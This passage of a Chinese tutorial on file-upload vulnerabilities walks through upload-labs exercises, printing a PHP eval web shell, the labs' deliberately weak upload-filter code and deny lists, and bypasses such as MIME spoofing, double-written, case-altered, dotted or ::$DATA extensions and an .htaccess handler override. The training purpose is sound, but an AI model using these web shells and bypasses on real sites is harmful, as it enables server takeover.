<p>如果 <code>allow_ext</code> 字符串中不包含 <code>ext_name</code>（此时 indexof 方法返回 -1），说明文件类型不被允许上传。</p>
<p>如果条件成立，则弹出警告框提示用户上传正确的文件类型，并返回 <code>false</code> 阻止表单提交。</p>
</li>
</ol>
<p>那么最简单的方法就是前端禁用 JavaScript </p>
<p>以 Google 浏览器为例：</p>
<p>访问：chrome:&#x2F;&#x2F;settings&#x2F;content&#x2F;javascript</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/1f929a79febdb2b0dc62b75fb259093b.png" alt="image-20240506184255910"></p>
<p>webshell.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span>(<span class="number">123</span>); @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上传成功</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/d0812ed91582307cdb521db33db83ecc.png" alt="image-20240506185341228"></p>
<p>访问图片地址 <a target="_blank" rel="noopener" href="http://127.0.0.1/uploadlabs/upload/webshell.php">http://127.0.0.1/uploadlabs/upload/webshell.php</a> （右键点击图片会显示）</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/0963c34cec0a4e29329b777e24de0f94.png" alt="image-20240506190043432"></p>
<p>有回显 123 说明 webshell 被成功解析！此时可以用 POST 方法进行命令执行：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/a0aeae53ddeaadd33e2719f48225be06.png" alt="image-20240506191426539"></p>
<p>或者可以连接蚁剑：</p>
<p>连接密码为 <code>$_POST</code> 中的参数</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/629515bb5bb9640289a0275222eab0ff.png" alt="image-20240506192253074"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/51eb5675e894bcb0a3f90a72f7331349.png" alt="image-20240506192211675"></p>
<h3 id="服务端检测"><a href="#服务端检测" class="headerlink" title="服务端检测"></a>服务端检测</h3><p>服务端检测就是网站对用户上传的文件的检测代码放置在服务器里，当用户上传的文件通过了检测才会被允许保存在服务器里。</p>
<h4 id="MIME-类型检测"><a href="#MIME-类型检测" class="headerlink" title="MIME 类型检测"></a>MIME 类型检测</h4><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准，用来表示文档、文件或字节流的性质和格式。简单来说就是用来表示我们提交的数据的类型。</p>
<p>检测方式：通过检查 <code>http</code> 包的 <code>Content-Type</code> 字段中的值来判断上传文件是否合法。</p>
<p>一般采取白名单的方式来进行检测，如只能上传图像文件的话就 <code>Content-Type</code> 头就必须为 <code>image/jpeg</code> 或 <code>image/png</code> 或 <code>image/gif</code>。</p>
<p>在 <code>http</code> 数据包中在 <code>Content-Type</code> 字段常见值有：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文本：text/plain、text/html、text/css、text/javascript、text/xml</span><br><span class="line">图片：image/gif、image/png、image/jpeg</span><br><span class="line">视频：video/webm、video/ogg</span><br><span class="line">音频：audio/midi、audio/mpeg、audio/webm、audio/ogg、audio/wav</span><br><span class="line">二进制：application/octet-stream、application/pdf、application/json</span><br><span class="line">在表单中进行文件上传：multipart/form-data</span><br></pre></td></tr></table></figure>

<p>绕过：一般来说网站的上传点是允许上传图片的，所以可以利用 <code>BurpSuite</code> 截取并修改数据包中的 <code>Content-Type</code> 字段的值为图片类型的值从而进行绕过。</p>
<h5 id="实例：-1"><a href="#实例：-1" class="headerlink" title="实例："></a>实例：</h5><p>upload-labs Pass-02：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];          </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接来看关键代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) </span><br></pre></td></tr></table></figure>

<p><code>$_FILES[&#39;upload_file&#39;][&#39;type&#39;]</code>：文件的 MIME 类型，需要浏览器提供该信息的支持，例如 <code>image/gif</code>。</p>
<p>那么我们对应的就要改 MIME 类型为 jpg 、 png 和 gif</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/b4d79ed31bbe12461b752661d2ea4943.png" alt="image-20240506194122559"></p>
<p><del>其实直接传 jpg 、 png 和 gif 文件马然后把后缀该为 php 就可以了…</del></p>
<h4 id="文件后缀检测"><a href="#文件后缀检测" class="headerlink" title="文件后缀检测"></a>文件后缀检测</h4><h5 id="黑名单检测"><a href="#黑名单检测" class="headerlink" title="黑名单检测"></a>黑名单检测</h5><p>一般情况下，代码文件里会有一个数组或者列表，该数组或者列表里会包含一些非法的字符或者字符串，当数据包中含有符合该列表的字符串时，即认定该数据包是非法的。 </p>
<h6 id="如何确认是否是黑名单检测"><a href="#如何确认是否是黑名单检测" class="headerlink" title="如何确认是否是黑名单检测"></a>如何确认是否是黑名单检测</h6><p>黑名单是有限的，可以随意构造一个文件后缀，如果可以上传，则说明是黑名单检测。</p>
<h6 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h6><ul>
<li><p>后缀双写绕过：</p>
<p>有些代码中，会将文件后缀符合黑名单列表的字符串替换为空，比如将 php 替换为空，这时可以将木马命名为 webshell.pphphp，这样上传后的文件名为 webshell.php。具体命名根据文件类型和替换规则确定。</p>
<p>实例：</p>
<p>upload-labs Pass-11：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>关键代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br></pre></td></tr></table></figure>

<p>会将 <code> $file_name</code> 中匹配到 <code> $deny_ext</code> 的字符替换为空，并且该函数不区分大小写。</p>
<p>由于该函数进行逐一查找时并不会去检查已经被查找、替换后的字符串拼接未被查找、替换后字符串是否符合替换标准，所以我们可用 <code>webshell.pphphp</code> 绕过。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/d08a5113ddfbaac22d6d8b225184b30d.png" alt="image-20240508093428998"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/3fa0a0b2a89ad8f2edd5c3da3df67fdd.png" alt="image-20240508093742509"></p>
</li>
<li><p>后缀大小写绕过（适用于 windows 系统）：</p>
<p>可以上传后缀为大写字母的文件，利用 windows 对大小写不敏感，来访问和执行木马。</p>
<p>upload-labs Pass-05：</p>
<p>缺少了如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">// 转换为小写</span></span><br></pre></td></tr></table></figure>

<p>那么将后缀部分或全部大写都可以实现绕过：webshell.pHp、webshell.PHP … </p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/c8a347bfbdaa13c42096e4ed93f5037e.png" alt="image-20240508084103906"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/daf5291a5a44ee3dcc1c94e9434e0cc7.png" alt="image-20240508084248142"></p>
</li>
<li><p>空格绕过：</p>
<p>如果没有进行去空格处理，可以在后缀之后加空格 <code>.php </code> 绕过。</p>
<p>实例：</p>
<p>upload-labs Pass-07：</p>
<p>缺少了如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">// 首尾去空</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/f4b255269b6c59c999166f60424e230a.png" alt="image-20240508085726925"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/576110550bdc7d8511b959dea0ad5105.png" alt="image-20240508085829772"></p>
</li>
<li><p>点绕过：</p>
<p>如果没有进行去点（ . ）处理，可以在后缀之后加点（ .php. ），利用 windows 的特点， 会自动去点后缀名最后的点，进行绕过。</p>
<p>实例 1：</p>
<p>upload-labs Pass-05：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../common.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>); <span class="comment">// 删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">// 转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>); <span class="comment">// 去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">// 首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>问题代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);</span><br></pre></td></tr></table></figure>

<p> <code>delot</code> 从字符串的尾部开始，从后向前删除点 <code>.</code> ，直到该字符串的末尾字符不是 <code>.</code> 为止。</p>
<p>问题就在结束的位置的判断，如果我们上传的文件后缀名为 <code>php. .</code> 那么经过代码删除后的后缀为 <code>.php. </code>，从而成功上传。</p>
<p>成功上传的文件后缀 <code>.php. </code> 也会被自动删除点 <code>.</code> 和空格 <code> </code>，变为 <code>.php</code>，被成功解析和执行。</p>
<p>注意：由于 <code>delot</code> 判断机制，在后缀保证两点一空格的前提下怎么加点和加空格都可以，比如：<code>.php. . . . .</code></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/ecd979bd3f415335a4873f358b47436e.png" alt="image-20240507214430339"></p>
<p>连接蚁剑的话直接填上传的源地址就行，不用修改。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/ff319adb7a4cf24507d0d681c4e7df2e.png" alt="image-20240507214911346"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/6b09d4adfd9f8c10c20523fe07cec052.png" alt="image-20240507214847137"></p>
<p>实例 2：</p>
<p>upload-labs Pass-06：</p>
<p>缺少了如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>); <span class="comment">// 删除文件名末尾的点</span></span><br></pre></td></tr></table></figure>

<p>直接用实例 1 的 payload 就行了</p>
</li>
<li><p><code>::$DATA</code> 绕过：<br>如果没有对后缀名进行去<code>::$DATA</code>处理，利用 windows 特点（window 对于文件和文件名的限制，以下字符放在结尾时，不符合操作系统的命名规范，在最后生成文件时，字符会被自动去除），可以忽略 <code>::$DATA</code>，直接访问前面的文件名。</p>
<p>如果文件名+ <code>::$DATA</code> 会把 <code>::$DATA</code> 之后的数据当成文件流处理，不会检测后缀名，且保持 <code>::$DATA</code> 之前的文件名。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/bf4000c12ca8a47b177fa1923680c716.png" alt="20210518214952407"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/b8cd40c9bb3cefeeb71f9bbe48b290ab.png" alt="20210518215322209"></p>
<p>实例：</p>
<p>upload-labs Pass-09：</p>
<p>缺少了如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>); <span class="comment">// 去除字符串::$DATA</span></span><br></pre></td></tr></table></figure>

<p>那就上传 <code>webshell.php::$DATA</code></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/22e42767dd5a3d4e266b442e9210f500.png" alt="image-20240508091032414"></p>
<p>注意：访问上传后的文件路径时要将后缀 <code>::$DATA</code> 删去</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/c9dacdf666130e577585bcb697eb4f09.png" alt="image-20240508091413882"></p>
</li>
<li><p>其它可解析后缀绕过：</p>
<p>前提是 apache 的 httpd.conf 中有如下配置代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure>

<p>可解析后缀：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP：php2、php3、php5、phtml、pht</span><br><span class="line">ASP：asa、cer、cdx</span><br><span class="line">ASPX：ascx、ashx、asac</span><br><span class="line">JSP：jspx、jspf</span><br></pre></td></tr></table></figure>

<p>（注意：能成功上传不一定意味着该文件类型能被成功解析）</p>
<p>实例：</p>
<p>upload-labs Pass-03：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../common.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]); <span class="comment">// 移除字符串两侧的空白字符或其他预定义字符</span></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>); <span class="comment">// 从字符串的尾部开始，从后向前删除点.，直到该字符串的末尾字符不是.为止</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>); <span class="comment">// 搜索 . 在字符串中的位置，并返回从该位置到字符串结尾的所有字符</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">// 转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>); <span class="comment">// 去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">// 移除字符串两侧的空白字符或其他预定义字符</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;  </span><br><span class="line">            <span class="comment">// 最终的上传路径随机，一部分与目前时间有关，另一部分是随机数</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>用黑名单不允许上传 <code>.asp</code> 、<code>.aspx</code> 、<code>.php</code> 、<code>.jsp</code> 后缀的文件</p>
<p>直接传 webshell.phtml 的木马，再访问上传后图片的地址：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/fdd38d4046b38713a4cb04935becf837.png" alt="image-20240507001016059"></p>
</li>
<li><p>图片 + 配置文件绕过：</p>
<p><code>.htaccess</code> 文件，是 apache 服务器的一个配置文件，全称是 Hypertext Access（超文本入口），提供了针对目录改变配置的方法，即在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。<code>.htaccess</code> 文件可以修改 apache 的配置，但仅作用于当前目录。</p>
<p><code>.htaccess</code>文件内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;webshell.png&quot;&gt;</span><br><span class="line">setHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

